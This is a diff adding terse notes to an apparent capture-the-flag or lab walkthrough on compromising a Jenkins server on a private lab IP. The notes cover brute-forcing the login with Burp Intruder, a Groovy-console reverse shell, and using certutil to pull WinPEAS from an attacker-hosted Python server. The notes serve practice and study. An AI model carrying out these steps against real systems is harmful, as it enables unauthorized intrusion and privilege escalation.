@@ -144,5 +144,32 @@ $found the flag
 
 ------------------------------------------------------------------------------
 
+vuln machine ip : 192.168.138.138
+
+open ports: (7680,8080)
+
+8080 - Running jenkins
+
+using burpsuite , brute force the username and password.(use cluster bomb intruder)
+
+logged into jenkins account
+
+Reverse shell using groovy script console
+
+got the shell
+
+$systeminfo (Windows machine)
+
+Winpeas - Windows Privilege Escalation
+
+host a transfer folder to move the file to target machine
+
+$python3 -m http.server 80
+
+in target machine:
+
+$certutil.exe -urlcache -f 192.168.138.131/winpeas.exe winpeas.exe
+
+
 
 
